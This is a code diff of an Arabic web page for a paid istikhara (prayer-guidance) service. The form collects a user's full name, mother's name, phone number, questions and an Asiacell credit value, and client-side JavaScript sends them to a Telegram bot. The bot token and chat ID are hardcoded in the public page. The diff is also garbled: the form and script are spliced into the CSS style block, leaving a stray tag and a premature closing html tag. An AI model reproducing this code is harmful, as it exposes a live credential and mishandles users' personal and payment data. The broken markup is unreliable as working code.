@@ -176,32 +176,7 @@
 
     <p>اللهم إني أستخيرك بعلمك، فصل على محمد وآله، واقض لي بالخيرة، وألهمنا معرفة الاختيار، واجعل ذلك ذريعة إلى الرضا بما قضيت لنا، والتسليم لما حكمت، فأزح عنا ريب الارتياب، وأيدنا بيقين المخلصين</p>
 
-    <form action="https://formspree.io/f/manybgnv" method="POST">
-        <label for="fullName">الاسم الثلاثي</label>
-        <input type="text" id="fullName" name="fullName" required>
-
-        <label for="motherName">اسم الأم الثلاثي</label>
-        <input type="text" id="motherName" name="motherName" required>
-
-        <label for="phone">رقم الهاتف</label>
-        <input type="text" id="phone" name="phone" required>
-
-        <label for="question1">الاستفسار الأول</label>
-        <textarea id="question1" name="question1" rows="3" required></textarea>
-
-        <label for="question2">الاستفسار الثاني</label>
-        <textarea id="question2" name="question2" rows="3" required></textarea>
-
-        <label for="question3">الاستفسار الثالث</label>
-        <textarea id="question3" name="question3" rows="3" required></textarea>
-
-        <label for="asiaCredit">ادخل رصيد اسيا</label>
-        <input type="number" id="asiaCredit" name="asiaCredit" required>
-
-        <button type="submit">إرسال الخيرة</button>
-    </form>
-</div>
-
+    <
 
     </style>
 </head>
@@ -212,7 +187,87 @@
 
         body {
             font-family: 'Scheherazade New', serif;
-            background-color: #f4f4f4;
+    
+    <form id="contactForm">
+        <label for="fullName">الاسم الثلاثي</label>
+        <input type="text" id="fullName" name="fullName" required><br><br>
+
+        <label for="motherName">اسم الأم الثلاثي</label>
+        <input type="text" id="motherName" name="motherName" required><br><br>
+
+        <label for="phone">رقم الهاتف</label>
+        <input type="text" id="phone" name="phone" required><br><br>
+
+        <label for="question1">الاستفسار الأول</label>
+        <textarea id="question1" name="question1" rows="3" required></textarea><br><br>
+
+        <label for="question2">الاستفسار الثاني</label>
+        <textarea id="question2" name="question2" rows="3" required></textarea><br><br>
+
+        <label for="question3">الاستفسار الثالث</label>
+        <textarea id="question3" name="question3" rows="3" required></textarea><br><br>
+
+        <label for="asiaCredit">ادخل رصيد اسيا</label>
+        <input type="number" id="asiaCredit" name="asiaCredit" required><br><br>
+
+        <button type="submit">إرسال الاستفسار</button>
+    </form>
+
+    <script>
+        document.getElementById("contactForm").addEventListener("submit", function(e) {
+            e.preventDefault();  // منع الإرسال التقليدي للنموذج
+
+            // جمع البيانات من النموذج
+            const fullName = document.getElementById("fullName").value;
+            const motherName = document.getElementById("motherName").value;
+            const phone = document.getElementById("phone").value;
+            const question1 = document.getElementById("question1").value;
+            const question2 = document.getElementById("question2").value;
+            const question3 = document.getElementById("question3").value;
+            const asiaCredit = document.getElementById("asiaCredit").value;
+
+            // تكوين النص الذي سيتم إرساله إلى البوت
+            const message = `
+            الاسم الثلاثي: ${fullName}
+            اسم الأم: ${motherName}
+            رقم الهاتف: ${phone}
+            الاستفسار الأول: ${question1}
+            الاستفسار الثاني: ${question2}
+            الاستفسار الثالث: ${question3}
+            رصيد اسيا: ${asiaCredit}
+            `;
+
+            // إعداد URL الخاص بـ API بوت التلغرام
+            const token = "7836939235:AAHStittrb_dr5xyrgEjvs2bkslHnsz3UWU"; // استبدل بـ API Token الخاص بك
+            const chatId = "7339992828"; // استبدل بـ Chat ID الخاص بك
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            // إرسال البيانات إلى بوت التلغرام عبر POST request
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert("تم إرسال الاستفسار بنجاح!");
+                } else {
+                    alert("حدث خطأ أثناء إرسال الاستفسار.");
+                }
+            })
+            .catch(error => {
+                alert("حدث خطأ: " + error);
+            });
+        });
+    </script>
+</body>
+</html>        background-color: #f4f4f4;
             margin: 0;
             padding: 0;
             color: #444;
